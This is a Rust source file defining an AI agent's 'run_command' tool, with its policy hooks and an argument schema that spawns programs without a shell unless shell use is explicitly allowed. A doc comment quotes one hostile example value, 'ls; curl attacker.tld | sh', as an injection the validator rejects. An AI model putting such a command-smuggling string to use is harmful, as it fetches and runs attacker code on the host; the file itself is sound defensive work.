use crate::error::ToolError;
use crate::tool::{Tool, ToolContext};
use async_trait::async_trait;
use aura_core_types::ToolResult;
use aura_core_types::{Capability, ToolDefinition};

mod args;
mod background;
mod live;
mod output;
mod policy;
mod pty;
mod run;
mod spawn;
mod stop;
mod tags;
mod wait;
#[cfg(windows)]
mod windows;

use args::parse_run_args;
pub use live::LiveOutput;
pub use output::output_to_tool_result;
use policy::enforce_command_policy;
use run::execute_run_command;
pub use spawn::cmd_spawn;
pub use stop::stop_commands;
pub use tags::{ProcessTags, AGENT_ID_VAR, HARNESS_PID_VAR, TOOL_USE_ID_VAR};
pub use wait::cmd_run_with_threshold;

/// Result of a threshold-based wait operation.
///
/// When a command is run with a sync threshold:
/// - `Completed`: The command finished within the threshold
/// - `Pending`: The command is still running, handle returned for async tracking
pub enum ThresholdResult {
    /// Command completed within the threshold.
    Completed(std::process::Output),
    /// Command is still running after the threshold.
    Pending(std::process::Child),
}

/// `run_command` tool: run an external program.
///
/// Phase 2 hardening: the default invocation form is `program` +
/// `args`, which is spawned DIRECTLY (no shell wrapping). `program` is
/// validated against shell metacharacters and whitespace so a hostile
/// tool proposal like `program = "ls; curl attacker.tld | sh"` is
/// rejected as [`ToolError::InvalidArguments`] before any process is
/// spawned.
///
/// Callers that genuinely need a shell must:
/// 1. Enable `ToolConfig::command.allow_shell`
///    (or pass `allow_shell: true` per-call).
/// 2. Invoke with `shell_script: "<the script>"`.
///
/// By default
/// `ToolConfig::command.allowed_shell_scripts`
/// is empty, which follows the same "empty allowlist = all allowed"
/// convention used by `command_allowlist`: once `allow_shell == true`
/// is granted, any shell script is executable. Operators who want to pin
/// a specific set of scripts populate the list with verbatim entries,
/// which switches the gate back to strict membership checking.
///
/// The `command` (single shell string) form is retained for backward
/// compatibility and is treated identically to `shell_script`.
pub struct CmdRunTool;

#[async_trait]
impl Tool for CmdRunTool {
    fn name(&self) -> &str {
        "run_command"
    }

    fn definition(&self) -> ToolDefinition {
        ToolDefinition {
            name: "run_command".into(),
            description: "Run an external program. Default: pass 'program' + 'args' (no shell). \
                 Shell scripts require allow_shell=true; the optional allowed_shell_scripts list \
                 pins a specific set when non-empty (empty = all scripts allowed). \
                 For directory listings prefer the dedicated `list_files` tool over shelling out; \
                 on Windows the binary allowlist intentionally omits `ls` (use `dir` or `list_files`)."
                .into(),
            input_schema: run_command_input_schema(),
            cache_control: None,
            eager_input_streaming: None,
        }
    }

    fn required_capabilities(&self) -> Vec<Capability> {
        vec![Capability::InvokeProcess]
    }

    async fn execute(
        &self,
        ctx: &ToolContext,
        args: serde_json::Value,
    ) -> Result<ToolResult, ToolError> {
        let run_args = parse_run_args(&args, ctx);
        enforce_command_policy(&run_args, ctx)?;
        execute_run_command(run_args, ctx).await
    }
}

/// The JSON schema of the `run_command` arguments.
fn run_command_input_schema() -> serde_json::Value {
    serde_json::json!({
        "type": "object",
        "properties": {
            "program": {
                "type": "string",
                "description": "Executable name or path. Rejected if it contains whitespace, control chars, or shell metacharacters. Pair with 'args'."
            },
            "args": {
                "type": "array",
                "items": { "type": "string" },
                "description": "Arguments passed verbatim to 'program' (no shell parsing)."
            },
            "shell_script": {
                "type": "string",
                "description": "Opt-in shell script (sh -c on Unix, cmd.exe /C on Windows). Requires allow_shell=true. When ToolConfig::command.allowed_shell_scripts is non-empty the script must appear verbatim; an empty list permits any script. Mutually exclusive with 'program'/'args'."
            },
            "allow_shell": {
                "type": "boolean",
                "description": "Per-call opt-in for the shell_script path."
            },
            "cwd": {
                "type": "string",
                "description": "Working directory (default: workspace root)"
            },
            "working_dir": {
                "type": "string",
                "description": "Working directory (alias for 'cwd')"
            },
            "timeout_ms": {
                "type": "integer",
                "description": "Timeout in milliseconds; the command is stopped when it runs longer (default set by the host, usually a few seconds to minutes)"
            },
            "timeout_secs": {
                "type": "integer",
                "description": "Timeout in seconds (alternative to timeout_ms)"
            },
            "tty_cols": {
                "type": "integer",
                "description": "Run in a pseudo-terminal this many columns wide; output keeps terminal layout and ANSI colors, with stderr merged into stdout"
            },
            "background": {
                "type": "boolean",
                "description": "Start the command and return right away, for servers, watchers and long builds. Output goes to a log file; you get a message with the exit status when it ends, and can check on it with job_output or stop it with job_kill where those tools are offered. Ignores timeout and tty_cols."
            }
        }
    })
}

#[cfg(test)]
mod tests;
